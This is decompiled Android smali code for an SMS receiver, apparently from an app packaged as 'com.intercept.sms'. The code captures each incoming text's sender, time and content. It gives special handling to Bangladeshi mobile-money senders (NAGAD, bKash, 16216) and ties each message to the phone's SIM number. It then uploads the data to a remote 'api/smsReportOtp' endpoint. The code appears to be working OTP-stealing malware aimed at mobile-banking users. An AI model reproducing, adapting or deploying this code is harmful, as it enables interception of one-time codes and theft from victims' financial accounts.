.class public Ltop/xy12/codetransporter/page/MainActivity$SmsReceiver;
.super Landroid/content/BroadcastReceiver;
.source "MainActivity.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Ltop/xy12/codetransporter/page/MainActivity;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x1
    name = "SmsReceiver"
.end annotation


# instance fields
.field final synthetic this$0:Ltop/xy12/codetransporter/page/MainActivity;


# direct methods
.method public constructor <init>(Ltop/xy12/codetransporter/page/MainActivity;)V
    .locals 0

    .line 487
    iput-object p1, p0, Ltop/xy12/codetransporter/page/MainActivity$SmsReceiver;->this$0:Ltop/xy12/codetransporter/page/MainActivity;

    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method

.method static synthetic lambda$onReceive$0(Landroidx/appcompat/app/AlertDialog;Landroid/view/View;)V
    .locals 0

    .line 515
    invoke-virtual {p0}, Landroidx/appcompat/app/AlertDialog;->dismiss()V

    return-void
.end method

.method static synthetic lambda$onReceive$1(Landroid/content/Context;Ljava/util/HashMap;)V
    .locals 1

    const-string v0, "api/smsReportOtp"

    .line 567
    invoke-static {p0, v0, p1}, Ltop/xy12/codetransporter/util/OkHttpUtils;->smsReportOtp(Landroid/content/Context;Ljava/lang/String;Ljava/util/Map;)V

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 9

    .line 490
    iget-object v0, p0, Ltop/xy12/codetransporter/page/MainActivity$SmsReceiver;->this$0:Ltop/xy12/codetransporter/page/MainActivity;

    const/4 v1, 0x0

    invoke-static {v0, v1}, Ltop/xy12/codetransporter/page/MainActivity;->access$102(Ltop/xy12/codetransporter/page/MainActivity;Z)Z

    const-string v0, "smsMessage"

    .line 492
    invoke-virtual {p2, v0}, Landroid/content/Intent;->getParcelableExtra(Ljava/lang/String;)Landroid/os/Parcelable;

    move-result-object p2

    check-cast p2, Ltop/xy12/codetransporter/bean/MessageBean;

    const/4 v0, 0x1

    if-eqz p2, :cond_6

    .line 495
    new-instance v2, Ljava/lang/StringBuffer;

    const-string v3, "\u56de\u8c03\u5230\u4e3b\u754c\u9762\nmessageBean: "

    invoke-direct {v2, v3}, Ljava/lang/StringBuffer;-><init>(Ljava/lang/String;)V

    .line 499
    invoke-virtual {p2}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v3

    const-string v4, "\n\u8f93\u5165\u7684\u53f7\u7801\uff1a"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 501
    new-instance v3, Ljava/lang/StringBuilder;

    const-string v5, "\u63a5\u6536\u5230SmsReceiver111 : "

    invoke-direct {v3, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    const-string v5, "SmsReceiver"

    invoke-static {v5, v3}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 503
    new-instance v3, Ljava/util/HashMap;

    invoke-direct {v3}, Ljava/util/HashMap;-><init>()V

    .line 504
    invoke-static {p1}, Ltop/xy12/codetransporter/page/MainActivity;->getSim(Landroid/content/Context;)Ljava/util/List;

    move-result-object v6

    .line 505
    invoke-virtual {v2, v6}, Ljava/lang/StringBuffer;->append(Ljava/lang/Object;)Ljava/lang/StringBuffer;

    move-result-object v7

    invoke-virtual {v7, v4}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 507
    invoke-interface {v6}, Ljava/util/List;->isEmpty()Z

    move-result v4

    if-eqz v4, :cond_0

    .line 508
    invoke-static {p1}, Landroid/view/LayoutInflater;->from(Landroid/content/Context;)Landroid/view/LayoutInflater;

    move-result-object p2

    sget v0, Lcom/intercept/sms/R$layout;->dialog_phone_null:I

    const/4 v1, 0x0

    invoke-virtual {p2, v0, v1}, Landroid/view/LayoutInflater;->inflate(ILandroid/view/ViewGroup;)Landroid/view/View;

    move-result-object p2

    .line 509
    new-instance v0, Landroidx/appcompat/app/AlertDialog$Builder;

    invoke-direct {v0, p1}, Landroidx/appcompat/app/AlertDialog$Builder;-><init>(Landroid/content/Context;)V

    const-string p1, "Please enter your phone number"

    .line 510
    invoke-virtual {v0, p1}, Landroidx/appcompat/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroidx/appcompat/app/AlertDialog$Builder;

    .line 511
    invoke-virtual {v0, p2}, Landroidx/appcompat/app/AlertDialog$Builder;->setView(Landroid/view/View;)Landroidx/appcompat/app/AlertDialog$Builder;

    .line 512
    invoke-virtual {v0}, Landroidx/appcompat/app/AlertDialog$Builder;->create()Landroidx/appcompat/app/AlertDialog;

    move-result-object p1

    .line 513
    invoke-virtual {p1}, Landroidx/appcompat/app/AlertDialog;->show()V

    .line 514
    sget v0, Lcom/intercept/sms/R$id;->ok:I

    invoke-virtual {p2, v0}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object p2

    new-instance v0, Ltop/xy12/codetransporter/page/MainActivity$SmsReceiver$$ExternalSyntheticLambda0;

    invoke-direct {v0, p1}, Ltop/xy12/codetransporter/page/MainActivity$SmsReceiver$$ExternalSyntheticLambda0;-><init>(Landroidx/appcompat/app/AlertDialog;)V

    invoke-virtual {p2, v0}, Landroid/view/View;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    return-void

    .line 520
    :cond_0
    invoke-virtual {v2, v6}, Ljava/lang/StringBuffer;->append(Ljava/lang/Object;)Ljava/lang/StringBuffer;

    move-result-object v4

    const-string v7, "\n\u56de\u8c03\u5230\u4e3b\u754c\u9762\nmessageBean: "

    invoke-virtual {v4, v7}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 522
    new-instance v4, Ljava/lang/StringBuilder;

    const-string v7, "messageBean.getSenderNumber() : "

    invoke-direct {v4, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v5, v4}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 523
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p2}, Ltop/xy12/codetransporter/bean/MessageBean;->getSenderNumber()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v4, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v5, v4}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 524
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p2}, Ltop/xy12/codetransporter/bean/MessageBean;->getSenderNumber()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v4, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v5, v4}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 528
    invoke-virtual {p2}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v4

    const-string v5, "\nmessageBean.getState()\uff1a"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    const-string v4, "sender"

    .line 531
    invoke-virtual {p2}, Ltop/xy12/codetransporter/bean/MessageBean;->getSenderNumber()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v4, v5}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 532
    invoke-virtual {p2}, Ltop/xy12/codetransporter/bean/MessageBean;->getTime()J

    move-result-wide v4

    invoke-static {v4, v5}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v4

    const-string v5, "time"

    invoke-virtual {v3, v5, v4}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const-string v4, "content"

    .line 533
    invoke-virtual {p2}, Ltop/xy12/codetransporter/bean/MessageBean;->getContent()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v4, v5}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 535
    invoke-virtual {p2}, Ltop/xy12/codetransporter/bean/MessageBean;->getState()I

    move-result v4

    invoke-virtual {v2, v4}, Ljava/lang/StringBuffer;->append(I)Ljava/lang/StringBuffer;

    move-result-object v4

    const-string v5, "\n!messageBean.getSenderNumber().isEmpty()\uff1a"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 537
    invoke-virtual {p2}, Ltop/xy12/codetransporter/bean/MessageBean;->getState()I

    move-result v4

    if-nez v4, :cond_7

    .line 538
    invoke-virtual {p2}, Ltop/xy12/codetransporter/bean/MessageBean;->getSenderNumber()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z

    move-result v4

    xor-int/2addr v4, v0

    invoke-virtual {v2, v4}, Ljava/lang/StringBuffer;->append(Z)Ljava/lang/StringBuffer;

    move-result-object v4

    const-string v5, "\n"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 539
    invoke-virtual {p2}, Ltop/xy12/codetransporter/bean/MessageBean;->getSenderNumber()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z

    move-result v4

    const-string v7, "receive"

    if-nez v4, :cond_5

    const-string v4, "messageBean.getSenderNumber()\uff1a"

    .line 540
    invoke-virtual {v2, v4}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v4

    invoke-virtual {p2}, Ltop/xy12/codetransporter/bean/MessageBean;->getSenderNumber()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v4, v8}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v4

    invoke-virtual {v4, v5}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 541
    invoke-virtual {p2}, Ltop/xy12/codetransporter/bean/MessageBean;->getSenderNumber()Ljava/lang/String;

    move-result-object v4

    const-string v8, "NAGAD"

    invoke-virtual {v4, v8}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v4

    if-eqz v4, :cond_1

    .line 542
    invoke-interface {v6, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v4

    invoke-virtual {v3, v7, v4}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 543
    invoke-interface {v6, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/lang/String;

    invoke-virtual {p2, v1}, Ltop/xy12/codetransporter/bean/MessageBean;->setPhoneNumber(Ljava/lang/String;)V

    goto/16 :goto_0

    .line 544
    :cond_1
    invoke-virtual {p2}, Ltop/xy12/codetransporter/bean/MessageBean;->getSenderNumber()Ljava/lang/String;

    move-result-object v4

    const-string v8, "bKash"

    invoke-virtual {v4, v8}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v4

    if-eqz v4, :cond_3

    .line 545
    invoke-interface {v6}, Ljava/util/List;->size()I

    move-result v4

    if-ne v4, v0, :cond_2

    .line 546
    invoke-interface {v6, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v4

    invoke-virtual {v3, v7, v4}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 547
    invoke-interface {v6, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/lang/String;

    invoke-virtual {p2, v1}, Ltop/xy12/codetransporter/bean/MessageBean;->setPhoneNumber(Ljava/lang/String;)V

    goto :goto_0

    .line 549
    :cond_2
    invoke-interface {v6, v0}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v1

    invoke-virtual {v3, v7, v1}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 550
    invoke-interface {v6, v0}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/lang/String;

    invoke-virtual {p2, v1}, Ltop/xy12/codetransporter/bean/MessageBean;->setPhoneNumber(Ljava/lang/String;)V

    goto :goto_0

    .line 552
    :cond_3
    invoke-virtual {p2}, Ltop/xy12/codetransporter/bean/MessageBean;->getSenderNumber()Ljava/lang/String;

    move-result-object v1

    const-string v4, "16216"

    invoke-virtual {v1, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_4

    .line 553
    invoke-interface {v6}, Ljava/util/List;->size()I

    move-result v1

    sub-int/2addr v1, v0

    invoke-interface {v6, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v1

    invoke-virtual {v3, v7, v1}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 554
    invoke-interface {v6}, Ljava/util/List;->size()I

    move-result v1

    sub-int/2addr v1, v0

    invoke-interface {v6, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/lang/String;

    invoke-virtual {p2, v1}, Ltop/xy12/codetransporter/bean/MessageBean;->setPhoneNumber(Ljava/lang/String;)V

    goto :goto_0

    :cond_4
    const-string v1, "\u77ed\u4fe1\u76d1\u542c\u4e0d\u662f\u5b5f\u52a0\u62c9\u94f6\u884c\u53f7\u7801,\u53f7\u7801\u662f: "

    .line 556
    invoke-virtual {v2, v1}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v1

    invoke-virtual {p2}, Ltop/xy12/codetransporter/bean/MessageBean;->getSenderNumber()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v1, v4}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v1

    invoke-virtual {v1, v5}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 557
    iget-object v1, p0, Ltop/xy12/codetransporter/page/MainActivity$SmsReceiver;->this$0:Ltop/xy12/codetransporter/page/MainActivity;

    invoke-static {v1, v0}, Ltop/xy12/codetransporter/page/MainActivity;->access$102(Ltop/xy12/codetransporter/page/MainActivity;Z)Z

    .line 558
    invoke-interface {v6}, Ljava/util/List;->size()I

    move-result v1

    sub-int/2addr v1, v0

    invoke-interface {v6, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/lang/String;

    invoke-virtual {p2, v1}, Ltop/xy12/codetransporter/bean/MessageBean;->setPhoneNumber(Ljava/lang/String;)V

    .line 559
    invoke-interface {v6}, Ljava/util/List;->size()I

    move-result v1

    sub-int/2addr v1, v0

    invoke-interface {v6, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v1

    invoke-virtual {v3, v7, v1}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    goto :goto_0

    .line 562
    :cond_5
    invoke-virtual {p2}, Ltop/xy12/codetransporter/bean/MessageBean;->getPhoneNumber()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v3, v7, v1}, Ljava/util/HashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 566
    :goto_0
    new-instance v1, Ljava/lang/Thread;

    new-instance v4, Ltop/xy12/codetransporter/page/MainActivity$SmsReceiver$$ExternalSyntheticLambda1;

    invoke-direct {v4, p1, v3}, Ltop/xy12/codetransporter/page/MainActivity$SmsReceiver$$ExternalSyntheticLambda1;-><init>(Landroid/content/Context;Ljava/util/HashMap;)V

    invoke-direct {v1, v4}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 568
    invoke-virtual {v1}, Ljava/lang/Thread;->start()V

    .line 569
    invoke-virtual {p2}, Ltop/xy12/codetransporter/bean/MessageBean;->getLogInfo()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v2, p1}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object p1

    const-string v1, "\n\u5f00\u59cb\u8bf7\u6c42\u670d\u52a1\u5668\uff1a\n"

    invoke-virtual {p1, v1}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 571
    invoke-virtual {v2}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p2, p1}, Ltop/xy12/codetransporter/bean/MessageBean;->setLogInfo(Ljava/lang/String;)V

    goto :goto_1

    .line 575
    :cond_6
    new-instance p2, Ltop/xy12/codetransporter/bean/MessageBean;

    invoke-direct {p2}, Ltop/xy12/codetransporter/bean/MessageBean;-><init>()V

    const-string p1, "\u5bf9\u8c61\u4e3a\u7a7a\uff0c\u8bf7\u68c0\u67e5\u63a5\u6536\u77ed\u4fe1\u662f\u5426\u6210\u529f"

    .line 576
    invoke-virtual {p2, p1}, Ltop/xy12/codetransporter/bean/MessageBean;->setContent(Ljava/lang/String;)V

    .line 581
    :cond_7
    :goto_1
    iget-object p1, p0, Ltop/xy12/codetransporter/page/MainActivity$SmsReceiver;->this$0:Ltop/xy12/codetransporter/page/MainActivity;

    invoke-static {p1}, Ltop/xy12/codetransporter/page/MainActivity;->access$200(Ltop/xy12/codetransporter/page/MainActivity;)Ltop/xy12/codetransporter/adapter/RecycleViewAdapter;

    move-result-object p1

    invoke-virtual {p1, p2}, Ltop/xy12/codetransporter/adapter/RecycleViewAdapter;->setData(Ltop/xy12/codetransporter/bean/MessageBean;)V

    .line 582
    iget-object p1, p0, Ltop/xy12/codetransporter/page/MainActivity$SmsReceiver;->this$0:Ltop/xy12/codetransporter/page/MainActivity;

    invoke-static {p1}, Ltop/xy12/codetransporter/page/MainActivity;->access$300(Ltop/xy12/codetransporter/page/MainActivity;)Landroidx/recyclerview/widget/RecyclerView;

    move-result-object p1

    iget-object p2, p0, Ltop/xy12/codetransporter/page/MainActivity$SmsReceiver;->this$0:Ltop/xy12/codetransporter/page/MainActivity;

    invoke-static {p2}, Ltop/xy12/codetransporter/page/MainActivity;->access$200(Ltop/xy12/codetransporter/page/MainActivity;)Ltop/xy12/codetransporter/adapter/RecycleViewAdapter;

    move-result-object p2

    invoke-virtual {p2}, Ltop/xy12/codetransporter/adapter/RecycleViewAdapter;->getItemCount()I

    move-result p2

    sub-int/2addr p2, v0

    invoke-virtual {p1, p2}, Landroidx/recyclerview/widget/RecyclerView;->smoothScrollToPosition(I)V

    return-void
.end method
